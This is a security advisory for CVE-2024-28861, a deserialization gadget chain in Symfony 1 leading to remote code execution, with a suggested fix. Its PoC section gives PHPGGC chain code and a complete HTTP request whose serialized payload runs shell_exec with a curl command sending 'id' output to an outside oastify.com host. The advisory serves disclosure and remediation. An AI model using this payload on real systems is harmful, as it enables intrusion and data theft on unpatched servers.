# [M] Gadget chain in Symfony 1 due to uncontrolled unserialized input in sfNamespacedParameterHolder

## Summary
Severity: Medium
Advisory: GHSA-pv9j-c53q-h433
CVE: CVE-2024-28861
CWE: CWE-502
Ecosystem: Packagist
Published: 2024-03-22
Source: https://github.com/advisories/GHSA-pv9j-c53q-h433
Type: github-advisory

## Affected
- Packagist: `friendsofsymfony1/symfony1` — affected >=1.1.0 <1.5.19

## Details
### Summary
Symfony 1 has a gadget chain due to dangerous unserialize in `sfNamespacedParameterHolder` class that would enable an attacker to get remote code execution if a developer unserialize user input in his project.

### Details
This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:
```php
 public function executeIndex(sfWebRequest $request)
  {
    $a = unserialize($request->getParameter('user'));
  }
```

We will make the assumption this is the case in the rest of this explanation.

Symfony 1 provides the class `sfNamespacedParameterHolder` which implements `Serializable` interface. In particular, when an instance of this class is deserialized, the normal php behavior is hooked by implementing `unserialize()` method:
```php
    public function unserialize($serialized)
    {
        $this->__unserialize(unserialize($serialized));
    }
```

Which make an array access on the deserialized data without control on the type of the `$data` parameter:
```php
    public function __unserialize($data)
    {
        $this->default_namespace = $data[0];
        $this->parameters = $data[1];
    }
```

Thus, an attacker provide any object type in `$data` to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on `$data[0]` for any class implementing `ArrayAccess`  interface. `sfOutputEscaperArrayDecorator`  implements such interface. Here is the call made on `offsetGet()`:
```php
  public function offsetGet($offset)
    {
        $value = isset($this->value[$offset]) ? $this->value[$offset] : null;

        return sfOutputEscaper::escape($this->escapingMethod, $value);
    }
```
Which trigger `escape()` in `sfOutputEscaper` class with attacker controlled parameters from deserialized object with `$this->escapingMethod` and `$this->value[$offset]`:
```php
  public static function escape($escapingMethod, $value)
  {
    if (null === $value)
    {
      return $value;
    }

    // Scalars are anything other than arrays, objects and resources.
    if (is_scalar($value))
    {
      return call_user_func($escapingMethod, $value);
    }
```
Which calls `call_user_func` with previous attacker controlled input.


### PoC

So we need the following object to trigger an OS command like `shell_exec("curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)");`:

```php
object(sfNamespacedParameterHolder)#4 (1) {
  ["prop":protected]=>
  object(sfOutputEscaperArrayDecorator)#3 (2) {
    ["value":protected]=>
    array(1) {
      [0]=>
      string(66) "curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)"
    }
    ["escapingMethod":protected]=>
    string(10) "shell_exec"
  }
}
```

We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:
* gadgets.php:
```php
class sfOutputEscaperArrayDecorator
{
  protected $value;

  protected $escapingMethod;

  public function __construct($escapingMethod, $value) {
    $this->escapingMethod = $escapingMethod;
    $this->value = $value;
  }
}

class sfNamespacedParameterHolder implements Serializable 
{
    protected $prop = null;

    public function __construct($prop) {
      $this->prop = $prop;
    }

    public function serialize()
    {
        return serialize($this->prop);
    }

    public function unserialize($serialized)
    {
        
    }
}

```

* chain.php:
```php
namespace GadgetChain\Symfony;

class RCE16 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.0 <= 1.5.18';
    public static $vector = 'Serializable';
    public static $author = 'darkpills';
    public static $information = '';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));

        $tableInfo = new \sfNamespacedParameterHolder($escaper);
        
        return $tableInfo;
    }
}
```

And trigger the deserialization with an HTTP request like the following on a dummy test controller:

```http
POST /frontend_dev.php/test/index HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

user=C%3A27%3A%22sfNamespacedParameterHolder%22%3A183%3A%7BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A66%3A%22curl+https%3A%2F%2F7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7D
```

Note that CVSS score is not applicable to this kind of vulnerability.

### Impact
The attacker can execute any PHP command which leads to remote code execution.

### Recommendation
I recommend to add a type checking before doing any processing on the unserialized input like this example:
```php
public function unserialize($data)
{
    if (is_array($data)) {
      $this->default_namespace = $data[0];
      $this->parameters = $data[1];
    } else {
      $this->default_namespace = null;
      $this->parameters = array();

      // or throw an exception maybe?
    }
}
```

This fix should be applied in both `sfNamespacedParameterHolder` and `sfParameterHolder`.

## References
- https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-pv9j-c53q-h433
- https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28861.yaml
- https://github.com/FriendsOfSymfony1/symfony1
